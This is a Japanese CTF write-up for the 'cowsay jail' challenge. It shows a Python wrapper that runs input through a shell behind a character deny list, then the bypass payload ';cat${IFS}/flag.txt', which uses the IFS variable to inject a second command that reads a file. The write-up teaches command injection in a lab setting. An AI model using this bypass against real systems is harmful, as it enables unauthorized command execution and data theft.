---
title: Daily-AlpacaHack 「cowsay jail」Medium Writeup
description: シェルのIFS変数を利用して，区切り文字の文字列検査をバイパスする問題
date: 2026-10-15 00:10:00 +0900
categories: [CyberSecurity, CTF]
tags: [alpacahack, misc, command_injection]
---

# daily_alpaca-misc-medium-cowsay_jail

## Summary

本問はシェルのIFS変数を利用して，区切り文字の文字列検査をバイパスする問題です．

> - **Category**: Misc
> - **Description**: cowsayコマンドは文字列を強調できる素敵なコマンドです！
>   - 🦙 < フラグは /flag.txt にあるパカ
> - **Tools & TechStack**:
>   - Python
> - **Release**: 2026/10/13
>   {: .prompt-info }

**配布ファイル**

```
.
├── compose.yaml
├── Dockerfile
├── flag.txt
└── jail.py

1 directory, 4 files
```

---

## ソースコードの解析

`jail.py`

```python
import subprocess

argument = input("$ cowsay ")

deny_list = ["\t", " ", "-", "'", '"', "`", "(", ")", "<", ">", "&", "|"]
denied_characters = [c for c in deny_list if c in argument]
if len(denied_characters) > 0:
    raise SystemExit(f"The argument contains at least 1 denied character(s): {denied_characters}")

subprocess.run(
    f"cowsay {argument}",
    shell=True,
    stdin=subprocess.DEVNULL,  # no input
)
```

`jail.py` を読むと，`subprocess.run()` に `shell=True` が渡されています．  
そのため，文字列が `/bin/sh -c` に渡され，シェルがメタ文字を解釈することが可能です．

`cat` を認識させたいため，`cowsay; ...` のように，`;` 記号で1つ目のコマンドを完了させる方法を考えました．  
しかし，`cowsay;cat /flag.txt` にすると，`deny_list[]` の半角スペースにマッチしてしまうため，半角スペースを別の方法で表現する必要があります．

## IFS変数の利用

半角スペースの代わりに，`cat` とパスの間を区切るための方法を調べました．  
`Types of delimiters in the bash shell` とググると，方法が記載されてそうな記事が見つかりました．[^1]

記事内に，「**## Method 1: Using IFS variable**」と記載されているため，調べてみました．

**ターゲットコンテナの `IFS` の中身**

```shell
$ docker run --rm --entrypoint sh ifs-jail -c 'printf %s "$IFS" | od -An -tx1'
 20 09 0a

$ docker run --rm --entrypoint sh ifs-jail -c 'printf %s " " | od -An -tx1'
 20
```

**`IFS` (Internal Field Separator)** は特別なシェル変数であり，`\t, \n, -` 等の任意の区切り文字を設定できるようです．

### 文字チェックとシェル展開のタイミングによるバイパス

`argument` に `;cat${IFS}/flag.txt` が渡った時は，`${IFS}` というただの文字列なため，`deny_list[]` の区切り文字にはマッチしません．

しかし，その後の `subprocess.run()` でdashシェルによって `${IFS}` が `20 09 0a` として展開されるため，文字チェックをバイパスしたうえでコマンドを正常に実行することができます．

## 解法

`$IFS` でも動作しますが，`${IFS}` で展開が正常にされやすそうな方にしました．

```shell
$ nc <IP> <PORT>
$ cowsay ;cat${IFS}/flag.txt
 __
<  >
 --
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
<REDACTED>
```

---

## Notes

ターゲットコンテナだと `20 09 0a` の3byteだったけど，僕のZsh環境では `20 09 0a 00` の4byteだったから，環境によってデフォルトの値が違うみたい．

## References

[^1]: [Bash Scripting - Split String - GeeksforGeeks](https://www.geeksforgeeks.org/linux-unix/bash-scripting-split-string/)
